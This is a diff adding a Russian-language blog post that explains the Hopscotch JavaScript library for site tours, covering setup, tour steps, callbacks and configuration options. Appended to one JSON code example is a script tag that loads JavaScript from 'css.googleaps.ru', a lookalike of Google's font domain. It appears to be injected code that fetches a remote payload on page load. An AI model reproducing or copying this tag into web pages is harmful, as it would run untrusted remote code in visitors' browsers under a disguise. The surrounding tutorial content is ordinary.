@@ -1,0 +1,168 @@
+---
+layout: post
+status: publish
+published: true
+title: Виртуальный тур по вашему сайту или приложению
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: "Представляю вам простой и легкий фреймворк на Javascript для быстрого и
+  удобного создания виртуального тура по вашему сайту или приложению.\n\n"
+wordpress_id: 341
+wordpress_url: http://devdocs.ru/?p=341
+date: '2014-12-24 16:09:54 +0200'
+date_gmt: '2014-12-24 16:09:54 +0200'
+categories:
+- Верстка
+- Javascript
+tags:
+- ip
+- javascript
+- css
+- virtual tour
+- js
+comments: []
+---
+<p>Представляю вам простой и легкий фреймворк на Javascript для быстрого и удобного создания виртуального тура по вашему сайту или приложению.</p>
+<p><a id="more"></a><a id="more-341"></a></p>
+<h2><a href="https:&#47;&#47;github.com&#47;linkedin&#47;hopscotch">Hopscotch<&#47;a><&#47;h2><br />
+Имя этого фреймворка - Hopscotch. Этот фреймворк принимает в качестве опций обычный JSON объект и предлагает разработчикам интерфейс для удобного и простого позиционирования каждого шага тура.</p>
+<h3>Основные преимущества<&#47;h3></p>
+<ul>
+<li>Коллбэки (например, onStart, onEnd, onShow, onNext, onPrev, onClose)<&#47;li>
+<li>Возможность работы со множеством страниц по средствам sessionStorage (используются Cookies в качестве запасного варианта)<&#47;li>
+<li>Интернационализация<&#47;li>
+<li>и т.д.<&#47;li><br />
+<&#47;ul></p>
+<h3>Как использовать<&#47;h3><br />
+Для начала использования просто подключите hopscotch.css и hopscotch.js на странице. Эти действия подключат объект в глобальную область видимости js.</p>
+<pre class="brush: html; gutter: true">    <html><br />
+      <head><br />
+        <title>Мой первый тур по сайту<&#47;title></p>
+<link rel="stylesheet" href="css&#47;hopscotch.css"><&#47;link><br />
+      <&#47;head><br />
+      <body></p>
+<h1 id="header">Мой первый тур по сайту<&#47;h1></p>
+<div id="content">
+<p>Контент помещается здесь...<&#47;p><br />
+        <&#47;div><br />
+        <script src="js&#47;hopscotch.js"><&#47;script><br />
+        <script src="js&#47;my_first_tour.js"><&#47;script> <!-- в этом файле прописывайте ваш тур --><br />
+      <&#47;body><br />
+    <&#47;html><&#47;pre><br />
+В файле my_first_tour.js опишите и запустите ваш тур.</p>
+<pre class="brush: javascript; gutter: true"> &#47;&#47; определение тура<br />
+    var tour = {<br />
+      id: "hello-hopscotch",<br />
+      steps: [<br />
+        {<br />
+          title: "Мой заголовок",<br />
+          content: "Это заголовок на моей странице.",<br />
+          target: "header",<br />
+          placement: "right"<br />
+        },<br />
+        {<br />
+          title: "Мой контент",<br />
+          content: "Здесь я размещаю свой контент.",<br />
+          target: document.querySelector("#content p"),<br />
+          placement: "bottom"<br />
+        }<br />
+      ]<br />
+    };</p>
+<p>    &#47;&#47; Запустите ваш тур по сайту<br />
+    hopscotch.startTour(tour);<&#47;pre><br />
+И это все что требуется!</p>
+<h2>Определение шагов тура<&#47;h2><br />
+Hopscotch содержит ID тура, массив шагов, определенный в виде JSON данных где для каждого шага указываются специфические настройки. ID тура простой и уникальный идентификатор-строка. Тур должен содержать как минимум ID тура и массив из 1 или более шагов.</p>
+<h3>Основные настройки шагов тура<&#47;h3></p>
+<pre class="brush: javascript; gutter: true">    {<br />
+      id: "welcome_tour",<br />
+      steps: [<br />
+        {<br />
+          target: "header",<br />
+          placement: "bottom",<br />
+          title: "Это основное меню сайта",<br />
+          content: "Используйте меню для навигации по сайту"<br />
+        },<br />
+        {<br />
+          target: "profile-pic",<br />
+          placement: "right",<br />
+          title: "Изображение вашего профиля",<br />
+          content: "Загрузите изображение кликнув по этой кнопке."<br />
+        },<br />
+        {<br />
+          target: "inbox",<br />
+          placement: "bottom",<br />
+          title: "Ваша почта",<br />
+          content: "Сообщения от других участников сайта."<br />
+        }<br />
+      ]<br />
+    }<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+<strong>Очень важно:<&#47;strong> title и content указываются с помощью element.innerHTML. Это позволяет вставлять html элементы в эти поля. Будьте осторожны, помимо html туда можно вставить и вредоносный код. Всегда проверяйте, что вставляете в это поле.</p>
+<h2>Основной список настроек шагов тура:<&#47;h2></p>
+<h3>&nbsp;Обязательные<&#47;h3></p>
+<ul>
+<li><strong>target<&#47;strong> [STRING&#47;ELEMENT&#47;ARRAY] - id DOM элемента или сам DOM элемент, к которому привязывается шаг. Также можно указать массив из нескольких элементов. В этом случае Hopscotch прикрепит шаг к первому найденному элементу из списка.<&#47;li>
+<li><strong>placement<&#47;strong> [STRING] - указывается где будет выводиться всплывающее окошко. Возможные значения: "top", "bottom", "right", "left".<&#47;li><br />
+<&#47;ul></p>
+<h3>Необязательные<&#47;h3></p>
+<ul>
+<li><strong>title<&#47;strong> [STRING] - заголовок шага<&#47;li>
+<li><strong>content<&#47;strong> [STRING] - Содержимое<&#47;li>
+<li><strong>width<&#47;strong> [INT] - ширина всплывающего окна<&#47;li>
+<li><strong>padding<&#47;strong> [INT] - паддинг всплывающего окна<&#47;li>
+<li><strong>xOffset<&#47;strong> [INT] - горизонтальное положение для всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.<&#47;li>
+<li><strong>yOffset<&#47;strong> [INT] - вертикальное положение для всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.<&#47;li>
+<li><strong>arrowOffset<&#47;strong> [INT] - положение стрелки всплывающего окна. Значение можно указать в пикселях или "center". По умолчанию: 0.<&#47;li>
+<li><strong>delay<&#47;strong> [INT] - сколько милисекунд ждать перед переходом к следующему шагу. По умолчанию: 0.<&#47;li>
+<li><strong>zindex<&#47;strong> [INT] - z-index для всплывающего окна<&#47;li>
+<li><strong>showNextButton<&#47;strong> [BOOLEAN] - Показывать кнопку далее. По умолчанию: true.<&#47;li>
+<li><strong>showPrevButton<&#47;strong> [BOOLEAN] - Показывать кнопку назад. По умолчанию: true.<&#47;li>
+<li><strong>showCTAButton<&#47;strong> [BOOLEAN] - Показывать кнопку call-to-action. По умолчанию: false.<&#47;li>
+<li><strong>ctaLabel<&#47;strong> [STRING] - заголовок для кнопки call-to-action.<&#47;li>
+<li><strong>multipage<&#47;strong> [BOOLEAN] - следует ли считать следующий шаг на другой странице. По умолчанию: false.<&#47;li>
+<li><strong>showSkip<&#47;strong> [BOOLEAN] - Если true, кнопка 'Далее' определяется как 'Пропустить'. Default: false.<&#47;li>
+<li><strong>fixedElement<&#47;strong> [BOOLEAN] - укажите true если требуемый элемент имеет фиксированное позиционирование. По умолчанию: false.<&#47;li>
+<li><strong>nextOnTargetClick<&#47;strong> [BOOLEAN] - вызывает событие nextStep() когда по требуемому элементу кликнули мышкой. По умолчанию: false.<&#47;li><br />
+<&#47;ul></p>
+<h3>События<&#47;h3></p>
+<ul>
+<li><strong>onPrev<&#47;strong> [FUNCTION] - коллбэк на событие нажатия кнопки "Назад"<&#47;li>
+<li><strong>onNext<&#47;strong> [FUNCTION] - коллбэк на событие нажатия кнопки "Далее"<&#47;li>
+<li><strong>onShow<&#47;strong> [FUNCTION] - коллбэк на событие показа первого шага<&#47;li>
+<li><strong>onCTA<&#47;strong> [FUNCTION] - коллбэк на событие нажатия кнопки "call-to-action"<&#47;li><br />
+<&#47;ul></p>
+<h2>Настройки тура в целом<&#47;h2><br />
+Настройки могут быть указаны с использованием JSON данных или вызовом метода hopscotch.configure(). Данные настройки применяются ко всему туру на странице. В случае когда настройки тура перекрещиваются с настройками отдельнго шага , (например, "showPrevButton") приоритет отдается настройкам шага. Когда коллбэки определяются и в туре, и в шаге, то вызывается сначала коллбэк шага, затем коллбэк тура.</p>
+<ul>
+<li><strong>id<&#47;strong> [STRING] - Обязательно: уникальный строковый идентификатор тура.<&#47;li>
+<li><strong>bubbleWidth<&#47;strong> [NUMBER] - Ширина всплывающего окна по умолчанию. По умолчанию: 280.<&#47;li>
+<li><strong>bubblePadding<&#47;strong> [NUMBER] - Паддинг всплывающего окна по умолчанию. По умолчанию: 15.<&#47;li>
+<li><strong>smoothScroll<&#47;strong> [BOOLEAN] - Использовать ли плавную прокрутку к следующему шагу? По умолчанию: true.<&#47;li>
+<li><strong>scrollDuration<&#47;strong> [NUMBER] - Время, которое должно потратиться на скроллинг страницы в ms. Работает только если smoothScroll установлен в true. По умолчанию: 1000.<&#47;li>
+<li><strong>scrollTopMargin<&#47;strong> [NUMBER] - Когда страница скролится, сколько места должно быть между всплывающим окном и верхом вьюпорта? По умолчанию: 200.<&#47;li>
+<li><strong>showCloseButton<&#47;strong> [BOOLEAN] - Надо ли показывать кнопку "закрыть"? По умолчанию: true.<&#47;li>
+<li><strong>showPrevButton<&#47;strong> [BOOLEAN] - Надо ли показывать кнопку назад? По умолчанию: false.<&#47;li>
+<li><strong>showNextButton<&#47;strong> [BOOLEAN] - Надо ли показывать кнопку далее? По умолчанию: true.<&#47;li>
+<li><strong>arrowWidth<&#47;strong> [NUMBER] - Ширина стрелки по умолчанию (место между всплывающим окном и требуемым элементом). Используется для калькуляции позиции всплывающего окна. Опция пригодится, если вам потребуется изменить стрелку в вашем css. По умолчанию: 20.<&#47;li>
+<li><strong>skipIfNoElement<&#47;strong> [BOOLEAN] - Если указанный элемент не найден, надо ли переходить к следующему шагу? По умолчанию: true.<&#47;li>
+<li><strong>nextOnTargetClick<&#47;strong> [BOOLEAN] - Надо ли переходить к следующему шагу после клика по требуемому элементу? По умолчанию: false.<&#47;li>
+<li><strong>onNext<&#47;strong> [FUNCTION] - Выполняется после каждого клика по кнопке "Далее".<&#47;li>
+<li><strong>onPrev<&#47;strong> [FUNCTION] - Выполняется после каждого клика по кнопке "Назад".<&#47;li>
+<li><strong>onStart<&#47;strong> [FUNCTION] - Выполняется перед началом тура.<&#47;li>
+<li><strong>onEnd<&#47;strong> [FUNCTION] - Выполняется после окончания тура.<&#47;li>
+<li><strong>onClose<&#47;strong> [FUNCTION] - Выполняется когда пользователь решил закрыть тур.<&#47;li>
+<li><strong>onError<&#47;strong> [FUNCTION] - Выполняется когда требуемый элемент не найден на странице.<&#47;li>
+<li><strong>i18n<&#47;strong> [OBJECT] - Для интернационализации. Позволяет изменять тексты кнопок и номеров шагов.<&#47;li>
+<li><strong>i18n.nextBtn<&#47;strong> [STRING] - Название кнопки "Далее"<&#47;li>
+<li><strong>i18n.prevBtn<&#47;strong> [STRING] - Название кнопки "Назад"<&#47;li>
+<li><strong>i18n.doneBtn<&#47;strong> [STRING] - Название кнопки "Закончить"<&#47;li>
+<li><strong>i18n.skipBtn<&#47;strong> [STRING] - Название кнопки "Пропустить"<&#47;li>
+<li><strong>i18n.closeTooltip<&#47;strong> [STRING] - Текст для тултипа кнопки закрыть<&#47;li><br />
+<&#47;ul><br />
+&nbsp;</p>
+<p style="text-align: center;">Думаю основные моменты в этой статье я раскрыл. Если будут вопросы, <span style="text-decoration: underline;"><strong>пишите комментарии<&#47;strong><&#47;span> либо обратитесь к <a href="http:&#47;&#47;linkedin.github.io&#47;hopscotch&#47;#defining-callbacks" target="_blank">странице проекта<&#47;a> за примерами.<&#47;p></p>
